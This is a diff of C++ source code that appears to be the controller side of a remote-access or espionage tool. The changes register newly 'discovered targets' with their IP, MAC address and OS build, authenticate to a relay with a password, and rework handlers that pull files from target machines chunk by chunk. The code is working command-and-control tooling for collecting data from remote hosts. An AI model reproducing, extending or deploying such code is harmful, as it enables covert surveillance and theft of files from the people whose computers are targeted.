@@ -145,6 +145,18 @@ void  TargetConnection::ConnectionClosed()
         }        
     }
 }
+
+// 主动连接
+void TargetConnection::Send_IDE(const char* password)
+{
+
+	// 1 1 IDE TARG 密码\r\n
+	std::ostringstream buf;
+	buf << "1 1 IDE TARG " << password << "\r\n";
+	this->Write(buf);
+}
+
+
 //---------------------------------------------------------------------------
 void  TargetConnection::Send_Identity()
 {
@@ -165,20 +177,37 @@ void  TargetConnection::Send_HEL()
 //---------------------------------------------------------------------------
 int   TargetConnection::Handle_HEL(std::vector<std::string> & args)
 {
-    // TID PID HEL Result
-    //  0   1   2   3
-    //
+	// TID 0 TAR OSNUMBER LANID COMNAMEBASE64 FLAGID MAC IPADDR\r\n
+	assert(args.size() == 9);
+	ULONG       targetID        = strtoul(args[0].c_str(), NULL, 10);
+	ULONG       osBuildNumber   = strtoul(args[3].c_str(), NULL, 10);
+	ULONG       lanId   = strtoul(args[4].c_str(), NULL, 10);
+	std::string comNameBase64 = args[5];
+	ULONG       flag   = strtoul(args[6].c_str(), NULL, 10);
+	std::string macAddress = args[7];
+	std::string ip     = GetIPStrFromInt32(strtoul(args[8].c_str(), NULL, 10));
 
-    int result = atoi(args[3].c_str());
-    if (1 == result)
-    {
-        ownerTarget->tarConn = this;
-        ownerTarget->TargetDataConnOnline();
+	Target *tar = GetTargetFromGlobalMap(targetID);
+	if (NULL == tar)
+	{
+		tar  = new Target();
+		tar->dwProtocolVersion = 0;
+		tar->dwTargetID        = targetID;
+		tar->dwGroupID         = flag ;
+		QString convert = QString("%1").arg(targetID);
+		tar->aniTargetName     = convert.toStdString();
 
-        this->Send_DTK(ownerTarget->dwTargetID, 0, true);// 获取DirTask列表
-        this->Send_STK(ownerTarget->dwTargetID, 0);      // 获取SearchTask列表
-        this->Send_FTK(ownerTarget->dwTargetID, 0);      // 获取FileTask列表
-    }
+		tar->widTargetName     = convert.toStdWString();
+		tar->dwOsBuildNumber   = osBuildNumber;
+		tar->aniRemMacAddr     = macAddress ;
+		tar->aniRemPublicIpAddr= ip;
+		tar->bIsMyTarget = true;
+		tar->dwLangId = 0;
+		SendMessage(FrmMain->Handle, WM_NEW_TARGET, (unsigned int)tar, 1);
+
+		SetStatusInfoExA(STATUS_NOTE, "发现一个新目标(目标ID:%u,IP地址:%s, GroupId:%d)",
+			targetID, ip.c_str(), flag);
+	}
 
 	return 0;
 }
@@ -832,12 +861,13 @@ int   TargetConnection::Handle_SCH(std::vector<std::string> & args)
 //---------------------------------------------------------------------------
 void  TargetConnection::Send_DOW(FileTask *fileTask, int startPos)
 {
-	// TID PID DOWF TaskID StartPos
+	// TID PID DOW TaskID StartPos PathBase64
 	//  0   1   2     3       4
 	//
     
     std::ostringstream buf;    
-    buf << ownerTarget->dwTargetID << " 1 DOW " << fileTask->dwTaskID << " " << startPos << "\r\n";
+    buf << ownerTarget->dwTargetID << " 1 DOW " << fileTask->dwTaskID << " " << startPos << 
+		" " << WideToAnsi(fileTask->tarPathW).c_str() << "\r\n";
     this->Write(buf);
 }
 //---------------------------------------------------------------------------
@@ -846,9 +876,34 @@ int  TargetConnection::Handle_FDT(std::vector<std::string> & args)
 	// TID PID FDT TaskID Base64Path  CTHighDataTime CTLowDataTime LWHighDataTime LWLowDataTime	LAHighDataTime LALowDataTime
 	//  0   1   2    3			4			  5				6				7			  8				9			10
 	//
-        
+    
+	ULONG targetID = strtoul(args[0].c_str(),NULL,10);
+	Target *tarBlock = GetTargetFromGlobalMap(targetID);
+	if (NULL == tarBlock)
+	{
+		return 0;
+	}
+	bool bNewFileTask = false;
+	ULONG  pluginID    = strtoul(args[1].c_str(), NULL, 10);
     ULONG  taskID = strtoul(args[3].c_str(), NULL, 10);
     FileTask *lpFileTask = ownerTarget->GetFileTaskFromMap(taskID);
+	if (!lpFileTask)
+	{
+		lpFileTask = new FileTask;
+		lpFileTask->dwPluginID  = pluginID;
+		lpFileTask->dwTargetID  = targetID;
+		lpFileTask->dwTaskID    = taskID;
+		lpFileTask->taskDirect = FILEDOWN;
+		lpFileTask->taskType = TASK_FILEDATA;
+
+		lpFileTask->aniTmpTaskPath = tarBlock->aniLocalDataDir + "\\FileTasking\\" + QString("%1").arg(taskID).toStdString();
+		lpFileTask->ctrPathW       = L"..";
+		lpFileTask->tarPathW       = GetWideFromBase64(args[4].c_str());
+		lpFileTask->hFile          = NULL;
+
+		bNewFileTask = true;
+	}
+
     if (lpFileTask)
     {
 	    lpFileTask->dwCTHighDataTime = strtoul(args[5].c_str(), NULL, 10);
@@ -858,6 +913,11 @@ int  TargetConnection::Handle_FDT(std::vector<std::string> & args)
 	    lpFileTask->dwLAHighDataTime = strtoul(args[9].c_str(), NULL, 10);
 	    lpFileTask->dwLALowDataTime  = strtoul(args[10].c_str(), NULL, 10);
     }
+
+	if (bNewFileTask)
+	{
+		tarBlock->AddFileTask(lpFileTask);
+	}
     
     return 0;    
 }
@@ -1199,76 +1259,89 @@ int   TargetConnection::Handle_FTS(std::vector<std::string> & args)
 //---------------------------------------------------------------------------
 int  TargetConnection::Handle_DOW(std::vector<std::string> & args)
 {
-	// TID PID DOWF TaskID StartPos DATA DATALEN\r\FileContent
-	//  0   1   2      3      4       5     6
-	//
+	//  1   2   3   4        5         6           1      2
+	// TID PID DOW TASKID StartPos PATHBASE64\r\nDATA DataLen\r\n
+	// TID PID DOW TASKID StartPos PATHBASE64\r\nDATAFIN DataLen\r\n	
+	// TID PID DOW TASKID StartPos PATHBASE64\r\nERR ErrorCode\r\n	
 
-	// TID PID DOWF TaskID StartPos DATAFIN DATALEN\r\FileContent
-	//  0   1   2      3      4       5       6
-	//
+	// 如果不足两行，下次再处理
+	if (false == IsWholeLineAvailable())
+	{
+		RecoverCommand();
+		return -1;
+	}
 
-	std::string data;
-	int			dataLen = atoi(args[6].c_str());
-    if (dataLen > 0)
-    {
-        if (false == IsWholeDataAvailable(dataLen))
-        {
-            RecoverCommand();
-            return -1;
-        }
+	std::vector<std::string> args2 = SplitString(this->readBuffer.substr(0,this->readBuffer.find("\r\n")), " ");
+	std::string cmd = args2[0];
 
-        data = GetData(dataLen);
+	ULONG targetId = strtoul(args[0].c_str(),NULL,10);
+	assert(targetId == ownerTarget->dwTargetID);
+	Target* tarBlock = GetTargetFromGlobalMap(targetId);
 
-    }
+	if (cmd == "ERR")
+	{
+		ULONG lastErrCode = strtoul(args2[1].c_str(),NULL,10);
 
-    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
-    assert(targetId == ownerTarget->dwTargetID);
+		SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 添加文件下载指令失败 - 下载文件\"%s\" [%s]",
+			tarBlock->widTargetName.c_str(),
+			tarBlock->dwTargetID,
+			GetWideFromBase64(args[5]).c_str(),
+			ConvertErrorIdToStrW(lastErrCode).c_str());
+	}
+	else
+	{
+		std::string data;
+		int			dataLen = atoi(args2[1].c_str());
+		if (dataLen > 0)
+		{
+			if (false == IsWholeDataAvailable(dataLen + args2.size()))
+			{
+				RecoverCommand();
+				return -1;
+			}
 
-    ULONG taskId   = strtoul(args[3].c_str(),NULL,10);
-    FileTask *fileTask = ownerTarget->GetFileTaskFromMap(taskId);
-    if (fileTask == NULL)
-    {
-        return 0;
-    }
+			GetLine();
+			data = GetData(dataLen);
 
-    if (fileTask->taskStatus != WORKING)           //  0
-    {
-        ownerTarget->ScheduleTarFileTask();
-        return 0;
-    }
+		}
 
-    ULONG startPos = strtoul(args[4].c_str(),NULL,10);
-    int ret = SaveDataToLocalFile(fileTask, startPos, data.c_str(), dataLen);
-    if ( 0 != ret)
-    {
-        Send_ERR(fileTask);
-        return 0;
-    }
+		ULONG taskId   = strtoul(args[3].c_str(),NULL,10);
+		FileTask *fileTask = ownerTarget->GetFileTaskFromMap(taskId);
+		if (fileTask == NULL)
+		{
+			return 0;
+		}
 
-    if ("DATAFIN" == args[5])
-    {
-        // 关闭句柄
-        //
-        if (fileTask->hFile)
-        {
-            CloseHandle(fileTask->hFile);
-            fileTask->hFile = NULL;
-        }
+		if (fileTask->taskStatus != WORKING)           //  0
+		{
+			ownerTarget->ScheduleTarFileTask();
+			return 0;
+		}
 
-        // 通知中转，任务已经完成
-        //
-        this->Send_DOW(fileTask, -1);        
-    }
-    else
-    {
-        // Request next dowf data
-        //
-        this->Send_DOW(fileTask, fileTask->dwFinishedLen);
-    }
+		ULONG startPos = strtoul(args[4].c_str(),NULL,10);
+		int ret = SaveDataToLocalFile(fileTask, startPos, data.c_str(), dataLen);
+		if ( 0 != ret)
+		{
+			Send_ERR(fileTask);
+			return 0;
+		}
 
-    // 更新界面
-    //
-    ownerTarget->FileTaskProgressChanged(fileTask);
+		if ("DATAFIN" == args2[0])
+		{
+			// 关闭句柄
+			//
+			if (fileTask->hFile)
+			{
+				CloseHandle(fileTask->hFile);
+				fileTask->hFile = NULL;
+			}     
+		}
+
+		// 更新界面
+		//
+		ownerTarget->FileTaskProgressChanged(fileTask);
+
+	}
 
     return 0;
 }
